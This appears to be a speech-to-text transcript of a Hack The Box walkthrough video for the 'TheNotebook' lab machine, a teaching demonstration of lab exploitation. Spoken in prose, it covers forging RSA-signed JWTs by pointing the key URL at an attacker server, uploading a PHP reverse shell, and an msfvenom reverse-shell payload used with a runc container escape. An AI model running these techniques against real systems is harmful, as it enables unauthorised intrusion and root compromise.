 what's going on youtube this is ipsec i'm doing the notebook from hack the box which was a super fun linux box that used jwts in a way i had never seen or knew as possible instead of using the normal hashing algorithm to validate it used rsa and did it in an insecure way where we could modify the jwt header to have the server pull the rsa token off our server and then we create our own signing key for it to tell it we're admin and then after that we get a shell on the box and the private is a bit unique because we're not in a dhaka container we can use sudo to go into a container which is vulnerable to run c from 2019 and from that we go back out it just seems really weird because normally you land in a container from a webmax weight and try to get out this one we broke into the container and then when we break out we are root so with all that being said let's jump in as always start for the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it the notebook and then the ip address which is 10 10 10 230. this can take some time to run so i've already ran it look at the results we have just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server and then looking at this i'm guessing this is a ubuntu bionic but we can just google it quickly look at launchpad and then go and identify what type of ubuntu server this is it is bionic which is still an up-to-date one this isn't really that important to do but when doing assessments if i saw this being like ubuntu 14 which is trusty tar i know to try things that are outdated like dirty cal because it just means the os hasn't been updated so getting this little information definitely can be helpful and i'd also try things dirty cow is a bad example because that is like once i get on the box i would also try things like shell shock because that's vulnerable to um like web servers as well if they're hosting various things you can just look at like shock or video if you want to get more information there we also have http on port 80 and it's running engine x we have a few headers go off uh i don't know why this is saying filtered 110 it's rx api no idea but we should take a look at port 80 and maybe there's port knocking or something going on here it just behaved differently and that could just be filtered because i had latency while i was scanning so i'm going to do a second nmap scan to see if it says filtered again while we go poke at the site so going to 10 10 10 to 30 we can see the notebook and we get a page uh uses place to store notes uh the very first thing i like checking is like index.html not found php not found uh asp doubt it because this is linux but trying to find the extension uh slash index not found that is different so um definitely some type of mvc framework i believe that is like model view controller i want to say mvz framework and this is where knowing a little bit model view controller yeah but it's worth knowing a little bit of development helps you identify applications so off the bat i'd be thinking this is either ruby on rails or python we can go to register and try to register so i'm going to do ipsec please subscribe and we can do root at ipsec dot rocks and sign up and it says welcome back ipsec visit slash notes or selected from the nav bar so i'm going to go to notes we can add a note and then the other thing to keep in mind these urls are giving big like uuids which is going to be very hard to bruteforce this could be specific to a user so i'm going to look at my cookies and identify what is going on so this uid a10 a10 matches up it ends in 408 e so yes this looks like it is my user id so if i had other user ids that were here uh we could try seeing if we can access their nodes like an eye door vulnerability id or like indirect object reference i believe but we don't have any other users yet and um also this is not brute forceable so maybe if there was like a list users page we could look and see if we can get their ids and then try it that way but nothing there so we got a title and note so i'm going to just try a basic payload so i like doing this and then we'll also add a quote for good measure we can add a few quotes and special characters so what this is doing is i'm trying some basic um server-side template injection here and then i'm putting special characters to see if i can break it as well um like these quotes are designed to break sql so we'll just hit save and see what happens um nothing happens we can go to notes uh view note nothing again so if that said like either 16 four times four or literally four fours then that'd be handy because some like languages treat this differently some will convert this four into an integer and then do the multiplication some would treat this as a string and just repeat it four times and i'm sure there's other edge cases where applications do stupid things so nothing there the other thing i'm going to do is like just put basic html nothing malicious just to see if it's doing any type of filtering and we um don't have anything it's doing all html andy or i think it's any encoding but if i go into the source of this look at this ah i was expecting to see like ampersand and something but uh definitely no cross-site scripting because it's not treating that bold tag as html i guess and look here we still see open and closed brackets so on this notes page i don't really have that much we could send this over to sql map but um kind of drawing a blank so i'm going to go back into the storage and i did see this off thing that has a long um text field so i'm just going to v auth.cookie and paste is here and just eyeballing it it looks like a jwt token because we have a period here and then there's a period here so three sets of base 64 separated by periods most likely a jwt which is a java maybe it's yeah java web token i believe i always hate like expanding on acronyms on the fly but this piece is talking about how it's signed this is the actual data and then this is the signature which is huge i'm not used to saying signatures that big but yeah that's generally how jwt works so i'm going to go to jwt.io and then we can just paste this encoded thing and this is very different um if you go to ipsec.rocks and look at jwt uh they're normally not algorithm rsa256 or rs256 so this is definitely weird right here um i'm just used to seeing what am i used to seeing i think it's hs 256 or 512 or something like that but yeah so this looks weird we do have admin cap which i'm guessing is admin capability and in order to assign this thing we need the public key and private key so what i'm going to do is see if i can change this piece so all i'm going to do is copy this entire well not the whole entire blob i'm going to copy is there a period here okay i'm not used to having that jwt scrolls like that does not look like enough material in this red to cover this but we'll copy this twice for good measure and then echo what there we go base64-d and we have this so all i want to do is change this localhost 77 let's change it to be my ip so echo dash n or actually let's do wt header since this has quotes and everything is just easier to do in a text editor so i am 10 10 14 8 we can leave it on port 77 that should be fine and we can base64 jwd header uh dash w for rap zero to put it all on one line copy this entire thing and then we'll put it back into jwt.io to make sure it looks fine um java web tokens don't have padding so just get rid of that equals and this looks maybe it'll work we'll see uh let's copy this whole thing and then we should send it somehow so i'm just going to use burp suite for that but first nclvnp 7070 to listen on that port uh we're going to burp intercept is on uh we can close these windows i want to leave that jbt window up because that could be handy later go to sweet refresh the page and let's put our token here so cookie auth like this paste put it to repeater tab send it's taking a while which is a good sign going back here and we can see the server has requested priv key dot key which is very good so the server is going to us to get the private key instead of going to localhost 7070. the other thing i want to look at um that nmap probably finished so i just want to look at my notebook 2 dot nmap and we still see this port as being filtered so something odd is going on that port if i was had obsidian up this is where i take a note and record that but yeah so um we should i guess create a private key here and see if we can sign our own jwts to do that the first thing i want to do is make a www directory because i'm going to be hosting something and then we can create an rsa key with ssh keygen so dash t rsa block size let's do 4096 dash mode pem and we'll do jwt rs 256 dot key so it's generating the public private key and we can try catting these so let's cut this x-clip dash selection clipboard and then go back to this this was the private key and i'm just um i hit escape once because i had a line break at the end i don't know if that matters or not but just wanted to call it out and we can try this public key and see if it validates uh shoot that is not the right form so let's delete this and we have to just convert this public key because how this looks if you did not notice it's like an ssh id rsa we want it to be a certificate so let's do open ssl rsa dash in we can specify the key and then dash pub out to say public key out help form pem and then dash out we can say jwt rsa dot or we should say the algorithm fully key pub writing rsa key so let's cat that and this looks like a much better format than this so let's try copying this and we can see invalid signature when i paste this signature verified and out of curiosity if i hit line blank breaks here it looks like it does trim this output so that does not matter but now that it says signature verified we have public and private keys so i can change this admin capability to be one and we still have it validated so now let's copy we should host this so they call um the private key priv key dot pub so i'm gonna do ln s priv key dot wait where's the key uh priv key dot key it's not pub key and jwtrs256.key i got these things backwards priv key dot key so now if i cap this key it's just going to the private key if i want i can show you this so again that's just redirected here we could have created the key with this name to begin with but yeah oh well uh python 3-m http server port 77 70-70 yeah 70-70 um and then the next thing we want to do is i guess copy and paste this key i already copied it once but for good measure copy it again and swap out this auth with this and actually we probably don't want to use birth suite for this because it's not going to tell us too much other than if the key worked or not just swap out the cookie like that so now we have the new one we can turn intercept off and then if i hit this application again boom admin panel and we can look here the server requested a private key for validation so if we go into admin panel view notes we can see some things and before i go on um i want to look at that eye door vulnerability again real quick so one thing i would do is i would open a private window with no cookies and see if i can access this note as an authenticated user and we can now the other thing i would be doing now they have an authenticated session viewing the note of people that are authenticated so we can see two different users here that's eight three that's six one but i would be copying this and seeing if we just go to this page it will show all the notes for that user no let's see slash notes slash two so we can brute force notes if we just go to the notes page so if i go here to notes it says my notes if i try to go to that from an authenticated standpoint it's not found which is good we can try and authenticate hitting another user's authenticated to see if that works and these are all things i would recommend doing if you're testing applications and boom from an authenticated user i can view notes of another user if i get their id so this is just a good finding actually i can't say that yet because i am admin that's why i can do that um i'd revert to a non-admin state we can probably just log in to do that so login ipsec please subscribe so this has a regular cookie and we can copy this come on go slash notes not found so we can't list the notes of another user but you can brute force it because this is not a uuid and things like this are super common it's just an eye door vulnerability the last time i saw this was on a popular events ticketing system and where the confirmation key was like some cloud provider dot com slash confirm slash eoid of the event much like this and then slash like a number and that number was the um order of person registering for the event so if you were like number 354 and go there it would show you your receipt if you change it to 353 it would show you the person before used receipt and you could just brute force all the numbers and get a list of all the emails and addresses of people attending the event based upon that vulnerability so these things are very real and always something you should test so yeah let's just go back to the regularly scheduled hacking um going here we can view notes and let's just view all the notes we want to view these two because those are my test notes from hacking i have to fix an issue where php files are being executed this is a potential security risk so oh php files are being executed nice backups are scheduled so something going on with backups quotes from the notebook i'm guessing the movie is my data safe i would say no because they're eye door vulnerability i wonder if the admin is good enough to trust my data with definitely not the answer is no there so let's keep going on uh let's do admin panel and we can upload a file so we want to do something um typically i would just test off with first a super basic php file so if we do like uh v test.php and then all i do is an echo and say please subscribe and i don't want to test anything complex because there could be some like web server configuration that is preventing system p open p exact or whatever all the fancy waste xq code and php are but echo is never going to be blocked even php info is sometimes blocked i've seen so um always safe to just default to a basic echo as long as you can type the command correctly which we'll find out if i can so we have the file here let's go to 10 10 10 230 and just do the file we get please subscribe doesn't have the after hitting it it dies but didn't have the php tag so i know it executed that uh what we probably should do now is upload a reverse shell since it's php my favorite one is these lottanum scripts especially php then php dash reverse shell this seems to like almost always work we could just upload a php thing that has like a system execute but i find this to be my favorite to go off the bat so 10 10 14 8 is me let's change the port to you guessed it 9001 and let's just listen so i'm going to nc lvnp actually before i do that um let's do script rev shell dot log so we store our output and now i can do nc lvmp 9001 we can go here and upload a file so this time upload the php reverse shell save your file is here let's go 10 10 10 230 hit this new file it's hanging but we have a shell so first thing i'm going to do is upgrade my pty so python dash c import pty pty spawn then bash control z sdty raw minus echo fg enter and now i have like tab auto complete which is super handy but i'm also going to do export term is equal to x term and now i can export term is equal to extreme lower lowercase export term uppercase x there we go casing does matter but i always like being able to clear the screen so in the logs that's going to look pretty funny of me just doing a bunch of exports like what is he doing but yeah uh let's see we're on the box we could run like lin p's or something like that but i don't like starting off with that um i just like exploring the box a little bit we can look at when user.txt was created it was created today because that's when i spawned the box but we can see the user was probably created february 19th maybe february 17th because that's when bash history is he was created somewhere early february the other thing i like looking at is when the box was created and generally how i do that is i just go in this etsy ssh directory and look at when the host keys were generated because these rarely change when you do change them that's when you get that nasty ssh mesh is like someone could be hacking your system because the key doesn't match thing so they don't change this too often the box was built on february 12th um generally what i like doing is looking at files created after the box was built and then like seven days after and you can do that simply with a fine command so you can do find slash and then dash newer mt for modified time we can say 2021 02 12 and then not equal to a time newer than 20 21 02 19 and i probably should fix my lines because you can see it just did a weird line wrap of me going to be in the line uh let's see we probably don't care about user share so let's fix this line wrapping real quick i'm going to open a new pane stdy dash a and i open a new panes because this is the same size as the other one i want so i want 34 and 136 34 rows 136 columns so stty rows 36 columns 134. so now when i do this command it doesn't wrap because it knows there's 134 columns additionally if it does wrap it'll probably do a new line because it knows there's only 36 rows did i get that right 34 rows uh 34 and 136 there we go so let's see i like also doing dash ls and that's going to show full things and what my shell died oh wait no yeah my shell died that's rude nclvnp already inject what ssl tpa sudo grep nc uh grab 7070 oh crap 9001. uh nclvmp 9001. 7070 is the web server so i guess i have to do that shell again maybe something kills my shell after a period of time i'm not sure but that was rude okay so let's do this quickly so python dash c import pty pty dot spawn then bash python3 then sdty raw minus echo fg there we go export term equals x term sdty rose 36 columns 134 i reversed that again it's annoying lsla etsy ssh there we go so find slash newer mt 2020 102 12 newer mt 2021 02 19 let's just do and when i do the dash ls it crashed my terminal weird so maybe i shouldn't do dash ls or maybe i should pipe everything to devnol uh pipe airs to devenal let's see let's do that find command again do i still find okay if i run this without doing my pty trick doesn't crash okay we'll just not do the pty check i'm not sure exactly what's going on but i can work with this um i think i have to do that ls at the end though because i see files like january 2018 it's definitely not what we want so let's see yeah let's just do dash newer mt 2021 02 12 newer mt 20210219 try the ls here and this looks better find slash newer mt of course i don't have my history so i can't just quickly go up but i am in a script yeah let's just find slash newer mt 2021 o2 12. newer mt 2021 0219 dash ls okay let's copy this and go to directories we don't care about so we can do grep dash v let's see etsy probably don't care and var lib probably don't so let's get rid of those so slash etsy and then backslash pipe is an or ngrep and i'm always putting it with a space because it's space etsy if i don't then if etsy appears in the file name it would uh grip it out i also don't like cis and i also don't like proc to devenal and then before we paste this copy the command so don't like boot slash boot but already i can see something interesting we have ver backup home tur.gz and this um to devnol did nothing because i put it after the grep and grep wasn't erroring find was so i'd have to move the two dev null here so let's copy this and show that so copy paste we can see permission denied errors if i go here where i can now move my cursor we can put the two dev null and that's going to send error messages to the bitbucket so now we can copy paste and we don't get errors um probably should also get rid of lib so slash lib uh user share as well but you get the point just looking at files quickly and we can see home.target so let's look at this home file so i'm going to copy this to a place where we can probably edit it so slash temp and then we can enter zxvf home.gz and we have home noah so if we look at ls slash home that is the user and he has a ssh key so we can cap this ssh key copy it come on copy and then go to a new pane v i'll call this noaa dot key wrong clipboard there we go uh chmod 600 sh-i noah.key noaa at 10 10 10 230. and it let's send and there's a lot of packages that could be updated but do it lsla we can see user.txt we can check the pseudoers file and we can see we can execute a docker command on web app dev01 so that is weird um because we're not in a docker i do ls-la slash i don't see a dock or m in reverse shell we're not in a docker here so normally when you do prive-esque you're trying to act like get out of a docker it's kind of weird that it wants us to go in a docker so let's go take a look at the docker so we can go in do sh to execute shell we have to of course run that with sudo so now we are in the docker and we can see what this is i'm guessing this is that port 7070 because i did the ls and i saw this priv key so we could try just doing the super simple thing and saying priv key dot key cat that oh man that is a big one and see if we can use this to ssh with root uh the db is a sqlite database um cat create db.pi i was seeing if there's credentials here add users add notes user where's password we could try cracking these passwords to see if we can get a root password so first let's try this ssh key v root dot key again wrong clipboard sage mod 600 root dot key sage i root at 10 10 10 230 nope we could grab one of these passwords let's see how many characters this is echo dash n that's ugly there we go wc-c 64. is that that's not a shot one sum is it echo dash n wc-c 40 let's see we could just look at the code that'll probably be the easiest way because it could be multiple algorithms so we want to look at login let's see cat main dot pi log in so let's see shot 56 so we could try cracking these passwords but i don't think that's gonna work um i've already solved this box once i haven't done like all these routes i'm going i'm just trying to go like how i or i did go all these routes when i saw the box i'm trying my best to replicate that in a quick fashion but the other thing we could try is looking at the version of docker so we could do docker and we can look at this and probably google like the change log um we could also lsla on user bin docker and see it's from 2018 so let's see if this matches up so google.com docker let's see does this say 1906 so it is a version from 2018 so we'd probably be wanting to look at vulnerabilities within docker so google.com docker cve let's see 2018 nothing do they have game privileges code execution code execution here so let's look at these this is a 9.3 so chances are it is vulnerable to this cve so we can go to google.com docker exploit github and go to one of these pages we could look at both these cves this one is in go it doesn't provide any um [Music] pre-compiled stuff this one is i don't know what this is coded in but we have pocs this is just c but it has compiled stuff so let's go and follow these instructions it wants us to actually um [Music] use this to build a docker so we're just going to manually do this so let's do git clone i copy the git clone so i get cloned get cloned doesn't work let's go to run c and i want to do the exact poc and we want to probably replace this new run c binary because this is going to get what's executed and we could just create our own reverse shell or use msf venom is it dash l payloads because we need to get a linux reverse shell there we go linux x64 rev linux let's see i don't want x86 there we go um shell reverse tcp this is what i want so let's grab this so msf venom dash p linux x64 shell underscore reverse underscore tcp lhost equals 10 10 14 3 l port equals 9001 format is elf elf output new run c so this should create a reverse shell that will do what we want so 9001 new run c whoa 10 10 14 8 i don't know why i said three this is why i always test my reverse shells before i do the exploit because i'm horrible with ip addresses and typing things if you can't tell so there we go so we have all these files um so we probably want to look at what replace is doing let's see waiting for run c [Music] where's that docker file we can see how it's building so it doesn't apt-get so it's going to ch mod replace copy overwrite run c to slash overwrite run c c h mod it move bin bash to bash original copy bash evil to bin bash chmod x okay so let's do this python three dash m http server so let's just go into slash and then w get 10 10 14 8 80 and then we want new run c 8 000 not 80 80. uh we need to go into that docker environment so sudo l docker exec it web app dev01 sh sudo cd slash okay so wget 1010 14 8 8 000 new run c then we should just copy this so we can paste quickly i don't have the w there we go uh over right run c and then replace dot sh and then bash evil okay so it wanted me to copy ben bash to ben bash original copy bash let's just ch mod plus x bash evil over rap new there we go cp bash evil ben bash and then we should be able to do dot slash replace dot sh waiting for run c to be executed so we have to sh in and execute another command so this is noah dot key noah at 10 10 10 230 let me in come on then pseudo-l oh i should not have killed that pain and see lvnp oh wait it got it but i honestly think i killed my shell i can't wait to go in the video and look uh dot slash replace rsh waiting for it to be ran sh sudo there we go new connection and if i go to slash root cat root.text and we have rooted the box so hope you guys enjoyed the video take care and i will see you all next week